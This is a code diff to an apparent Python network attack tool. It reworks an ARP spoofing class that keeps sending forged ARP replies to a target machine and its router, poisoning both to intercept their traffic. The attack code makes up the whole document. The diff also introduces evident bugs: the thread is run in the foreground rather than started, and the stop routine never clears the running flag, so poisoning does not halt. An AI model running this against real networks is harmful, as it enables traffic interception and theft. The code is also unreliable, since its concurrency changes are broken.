@@ -4,7 +4,7 @@ from scapy.layers.l2 import ARP
 from nifty.network.utils import get_mac, get_router_ip
 from time import sleep
 import nifty.config as config
-import multiprocessing
+from threading import Thread
 from netfilterqueue import NetfilterQueue
 
 
@@ -14,14 +14,15 @@ class ARPSpoofer():
         self.router_ip = router_ip
         self.target_mac = get_mac(self.target_ip, interface)
         self.router_mac = get_mac(self.router_ip, interface)
+        self.running = False
         if not self.target_mac:
             raise Exception("Couldn't find target MAC")
         if not self.router_mac:
             raise Exception("Couldn't find router MAC")
-        self.poison_process = None
+        self.poison_thread = None
 
     def arp_poison(self):
-        while 1:
+        while self.running:
             send(ARP(op=2, pdst=self.target_ip,
                      psrc=self.router_ip, hwdst=self.target_mac), verbose=False)
             send(ARP(op=2, pdst=self.router_ip,
@@ -31,15 +32,15 @@ class ARPSpoofer():
     def start(self, verbose=True):
         if verbose:
             print("Starting ARP spoofing...")
-        self.poison_process = multiprocessing.Process(target=self.arp_poison)
-        self.poison_process.start()
+        self.poison_thread = Thread(target=self.arp_poison)
+        self.running = True
+        self.poison_thread.run()
 
     def stop(self, verbose=True):
         if verbose:
             print("Stopping ARP spoofing...")
-        if self.poison_process:
-            self.poison_process.terminate()
-            self.poison_process.join()
+        if self.poison_thread:
+            self.poison_thread.join(timeout=4)
             if verbose:
                 print("ARP spoofing stopped.")
 
